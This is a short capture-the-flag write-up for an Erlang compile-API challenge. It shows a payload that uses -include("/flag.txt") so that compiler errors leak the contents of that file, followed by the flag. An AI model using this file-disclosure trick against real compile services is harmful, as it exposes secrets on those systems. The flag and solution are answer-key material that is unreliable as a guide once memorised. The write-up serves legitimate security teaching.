# Erlify

### Category

Misc

### Description

I've made a simple API to compile erlang program, but I don't run it so.. I'm safe ?<br>

If you found a vulnerability, try to leak /flag.txt (don't forget to add Hero{} around the flag you've found)
<br>

Format : **Hero{flag}**<br>
Author : **Worty**

### Write up

You have to read the erlang programming manual to see that if you include a program or lib that is incorrect, part of the content is leak :)

Payload :

```
-module(hello_world).
-compile(export_all).
-include("/flag.txt").

hello() ->
    io:format("hello world~n")
```


### Flag

```Hero{Erl4ngC4nL34kAtC0mp1l3T1m3}```
